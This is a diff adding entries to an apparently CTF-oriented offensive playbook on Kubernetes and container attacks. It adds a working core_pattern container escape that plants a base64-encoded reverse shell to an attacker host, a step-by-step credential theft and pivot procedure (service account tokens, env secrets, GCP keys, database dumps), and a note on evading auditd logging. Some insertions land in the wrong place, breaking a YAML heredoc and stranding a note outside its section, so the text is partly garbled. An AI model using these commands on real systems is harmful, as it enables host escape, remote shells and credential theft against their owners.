@@ -96,6 +96,10 @@
 
   # If you have kubectl — create a pod with hostPath: /
   cat <<'YAML' | kubectl apply -f -
+  # If pod already has hostPath mounted, enumerate
+  ls /host/ /proc/self/mounts 2>/dev/null
+  find /host -name "*credentials*" -o -name "*secret*" -o -name "*.key" 2>/dev/null
+
   apiVersion: v1
   kind: Pod
   metadata:
@@ -188,4 +192,87 @@
 
   # Verify cluster-admin
   kubectl auth can-i '*' '*' --all-namespaces --token=$TOKEN
+  ```
+
+### Container Escape via Writable core_pattern [added: 2026-05]
+- **Tags:** #ContainerEscape #CorePattern #KernelExploit #Segfault #PrivEsc #ProcSys #HostEscape #WriteableProcSys
+- **Trigger:** Linpeas or manual check shows `/proc/sys/kernel/core_pattern` is writable (container lacks read-only proc protection) — common in containers running with excess capabilities or without `--security-opt=no-new-privileges`
+- **Prereq:** Shell inside a container + `/proc/sys/kernel/core_pattern` is writable (world-writable or container runs as root without kernel hardening) + ability to trigger a segfault
+- **Yields:** OS command execution on the HOST with the privileges of the segfaulting process — provides host filesystem access and `/flag` read
+- **Opsec:** High
+- **Context:** The Linux kernel executes the program named in `/proc/sys/kernel/core_pattern` when a process dumps core (segfaults). If you prepend `|` to the pattern, the kernel treats the rest as a command to execute. In misconfigured containers that share the host kernel namespace for `/proc/sys/kernel/`, writing to this file affects the HOST kernel — the subsequent segfault executes on the host, not just the container.
+- **Payload/Method:**
+  ```bash
+  # Step 1 — Verify core_pattern is writable
+  ls -la /proc/sys/kernel/core_pattern
+  # Also check if it's host-shared (not namespaced):
+  cat /proc/sys/kernel/core_pattern  # if blank or "core", it's likely shared
+
+  # Step 2 — Prepare reverse shell payload (base64-encode to avoid shell quoting issues)
+  # Payload: /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/9000 0>&1
+  PAYLOAD=$(echo '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/9000 0>&1' | base64 -w0)
+
+  # Step 3 — Write pipe-prefixed command to core_pattern
+  echo "|/bin/bash -c \"echo $PAYLOAD | base64 -d | /bin/bash\"" > /proc/sys/kernel/core_pattern
+
+  # Step 4 — Start listener on attack host
+  # (run this before triggering segfault)
+  nc -lnvp 9000
+
+  # Step 5 — Trigger segfault to invoke payload
+  sh -c 'kill -11 "$$"'
+  # Alternative: perl -e 'kill 11, $$'
+  # Alternative: python3 -c 'import ctypes; ctypes.string_at(0)'
+
+  # The kernel executes core_pattern command on segfault — shell lands on host
+  ```
+
+### Container Filesystem Credential Extraction — Service Accounts & Config Files [added: 2026-05]
+- **Tags:** #Container #Credentials #ServiceAccount #DockerFilesystem #AppConfig #EnvVars #ConfigExtraction #JSONKeys #CredPrivEsc
+- **Trigger:** Shell access inside a running container; want to escalate by extracting hardcoded or mounted service account credentials, API keys, or connection strings
+- **Prereq:** Shell inside a container + write access to mount the container or shell access to inspect running container via Docker API
+- **Yields:** Service account JSON keys, OAuth tokens, database credentials, API keys, or access to other environments/services
+- **Opsec:** Low
+- **Context:** Developers often mount service account keys, store credentials in application config files, or leave them in container environment variables. Once you have shell in a container, enumerate `/app`, `/root`, `/var/run/secrets/`, and mounted volumes for sensitive files. Keys, certificates, and credentials are common. Use these to pivot to other cloud services, databases, or internal APIs.
+- **Payload/Method:**
+  ```bash
+  # Step 1 — List mounted volumes and find credential locations
+  mount | grep -E "^\S+\s+on"
+  cat /proc/self/mountinfo | grep -E "^\s+/app|/root|/var/run/secrets"
+
+  # Step 2 — Enumerate common credential paths
+  find /app /root /var/run/secrets /opt /home -type f \( -name "*.json" -o -name "*.key" -o -name "*.pem" -o -name ".env" -o -name "*.yaml" -o -name "*.yml" \) 2>/dev/null | head -20
+
+  # Step 3 — Check environment variables for exposed credentials
+  env | grep -iE "key|secret|token|password|api|cred|auth"
+
+  # Step 4 — Extract service account credentials (common in GCP/AWS containers)
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token  # K8s SA token
+  cat /app/service-account-key.json
+  cat /root/.config/gcloud/application_default_credentials.json
+
+  # Step 5 — Read application configuration files
+  cat /app/config.json /app/.env /app/config.yaml
+  grep -r "apiKey\|password\|secret\|token" /app/ 2>/dev/null | head -10
+
+  # Step 6 — If mounted as Docker container, inspect layer history for hardcoded credentials
+  # (requires docker socket or external access)
+  docker history <IMAGE> --no-trunc | grep -iE "key|secret|password"
+  docker inspect <CONTAINER> | jq '.Config.Env'
+
+  # Step 7 — Check for database connection strings in common locations
+  cat /app/database.conf /app/config/database.yml
+  grep -i "password\|user\|host\|database" /app/web.config /app/appsettings.json 2>/dev/null
+
+  # Step 8 — Extract and use discovered credentials
+  # Example: GCP service account key → pivot to GCP
+  gcloud auth activate-service-account --key-file=/app/service-account-key.json
+  gcloud compute instances list --project <PROJECT>
+
+  # Example: Database creds → access database
+  mysql -h <DB_HOST> -u <USER> -p<PASSWORD> -e "SELECT * FROM credentials;"
+  ```
+  # Detection bypass note:
+  # core_pattern write is logged by auditd (if enabled) — High opsec risk
+  # Restore after use: echo 'core' > /proc/sys/kernel/core_pattern
   ```
